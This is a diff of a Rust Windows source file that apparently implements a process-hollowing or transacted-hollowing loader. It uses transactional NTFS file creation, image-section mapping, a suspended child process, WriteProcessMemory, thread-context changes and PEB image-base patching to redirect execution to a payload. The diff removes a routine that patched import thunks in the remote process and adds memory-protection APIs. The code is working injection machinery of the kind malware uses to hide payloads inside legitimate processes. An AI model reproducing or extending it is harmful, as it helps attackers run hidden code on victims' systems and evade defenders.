@@ -4,6 +4,7 @@
 
 extern crate alloc;
 
+use alloc::fmt::format;
 use core::ffi::{c_void, CStr};
 use core::hint::spin_loop;
 use core::mem::zeroed;
@@ -11,13 +12,13 @@ use core::ops::Deref;
 use core::ptr::{copy_nonoverlapping, null, null_mut};
 use utils::path::Path;
 use utils::{log_debug, WideString};
-use windows_sys::core::{PCWSTR, PWSTR};
-use windows_sys::Win32::Foundation::{CloseHandle, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE};
+use windows_sys::core::{PCSTR, PCWSTR, PWSTR};
+use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE, NTSTATUS, STATUS_IMAGE_NOT_AT_BASE, STATUS_SUCCESS, TRUE};
 use windows_sys::Win32::Security::SECURITY_ATTRIBUTES;
 use windows_sys::Win32::Storage::FileSystem::{CreateFileTransactedW, CreateFileW, CreateTransaction, GetFileSize, RollbackTransaction, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING};
 use windows_sys::Win32::System::Diagnostics::Debug::{GetThreadContext, SetThreadContext, WriteProcessMemory, CONTEXT, CONTEXT_INTEGER_AMD64, CONTEXT_INTEGER_X86, IMAGE_DIRECTORY_ENTRY_IMPORT, IMAGE_FILE_HEADER, IMAGE_NT_OPTIONAL_HDR64_MAGIC};
 use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
-use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualAlloc, FILE_MAP_READ, MEM_COMMIT, MEM_RESERVE, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SECTION_FLAGS, SEC_IMAGE};
+use windows_sys::Win32::System::Memory::{CreateFileMappingW, MapViewOfFile, UnmapViewOfFile, VirtualAlloc, VirtualProtectEx, FILE_MAP_READ, MEM_COMMIT, MEM_RESERVE, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SECTION_FLAGS, SEC_IMAGE};
 use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_IMPORT_BY_NAME, IMAGE_IMPORT_DESCRIPTOR, IMAGE_ORDINAL_FLAG32, IMAGE_ORDINAL_FLAG64};
 use windows_sys::Win32::System::Threading::{ResumeThread, CREATE_NO_WINDOW, CREATE_SUSPENDED, DETACHED_PROCESS, PROCESS_INFORMATION, STARTUPINFOW};
 use windows_sys::Win32::System::WindowsProgramming::{IMAGE_THUNK_DATA32, IMAGE_THUNK_DATA64};
@@ -447,98 +448,6 @@ fn redirect_ep(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) -
     update_remove_ep(pi, ep_va)
 }
 
-#[inline(always)]
-fn manual_import_by_name(
-    module_name: *const i8,
-    function_name: *const i8,
-    thunk_remote: PVoid,
-    pi: &PROCESS_INFORMATION
-) {
-    let module = unsafe {
-        LoadLibraryA(module_name as _)
-    };
-
-    if module.is_null() {
-        log_debug!("Failed to load module {:?}\n", unsafe { CStr::from_ptr(module_name) });
-        return;
-    }
-    
-    let proc_adr = unsafe {
-        GetProcAddress(
-            module,
-            function_name as _
-        )
-    };
-    
-    if unsafe {
-        WriteProcessMemory(
-            pi.hProcess,
-            thunk_remote,
-            &proc_adr as *const _ as PVoid,
-            size_of::<usize>(),
-            null_mut()
-        )
-    } == FALSE {
-        log_debug!(
-            "Failed to write import thunk at remote address {:p}\n",
-            thunk_remote
-        );
-    }
-}
-
-#[inline(always)]
-fn manual_import_by_ordinal(
-    module_name: *const i8,
-    ordinal: u64,
-    thunk_remote: PVoid,
-    _pi: &PROCESS_INFORMATION,
-) {
-    
-}
-
-macro_rules! fix_imports {
-    ($pe:expr, $base:expr, $pi:expr, $img_thunk:ty, $ordinal_flag:expr) => {{
-        let (mut desc, _) = get_image_import_data_dir($pe);
-
-        unsafe {
-            while (*desc).Name != 0 {
-                let name_ptr = $pe.add((*desc).Name as usize) as *const i8;
-
-                let mut thunk = if (*desc).Anonymous.OriginalFirstThunk != 0 {
-                    $pe.add((*desc).Anonymous.OriginalFirstThunk as usize) as *const $img_thunk
-                } else {
-                    $pe.add((*desc).FirstThunk as usize) as *const $img_thunk
-                };
-
-                while (*thunk).u1.AddressOfData != 0 {
-                    let thunk_rva = (thunk as usize) - ($pe as usize);
-                    let remote_thunk = ($base as usize + thunk_rva) as PVoid;
-
-                    if (*thunk).u1.Ordinal & $ordinal_flag != 0 {
-                        let ordinal = ((*thunk).u1.Ordinal & 0xFFFF) as _;
-                        manual_import_by_ordinal(name_ptr, ordinal, remote_thunk as *mut _, $pi);
-                    } else {
-                        let imp = $pe.add((*thunk).u1.AddressOfData as usize) as *const IMAGE_IMPORT_BY_NAME;
-                        let func_ptr = ((*imp).Name.as_ptr()).add(2);
-                        manual_import_by_name(name_ptr, func_ptr, remote_thunk as *mut _, $pi);
-                    }
-
-                    thunk = thunk.add(1)
-                }
-
-                desc = desc.add(1)
-            }
-        }
-    }};
-}
-
-fn fix_imports(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) {
-    match pe_architecture(loaded_pe) {
-        PeArchitecture::X64 => fix_imports!(loaded_pe, loaded_base, pi, IMAGE_THUNK_DATA64, IMAGE_ORDINAL_FLAG64),
-        PeArchitecture::X86 => fix_imports!(loaded_pe, loaded_base, pi, IMAGE_THUNK_DATA32, IMAGE_ORDINAL_FLAG32)
-    }
-}
-
 fn set_new_image_base(loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
     let Some(remote_peb_address) = get_remote_peb_address(pi) else {
         return false
@@ -560,8 +469,6 @@ fn set_new_image_base(loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
 }
 
 fn redirect_to_payload(loaded_pe: PByte, loaded_base: PVoid, pi: &PROCESS_INFORMATION) -> bool {
-    fix_imports(loaded_pe, loaded_base, pi);
-
     if !redirect_ep(loaded_pe, loaded_base, pi) {
         return false
     }
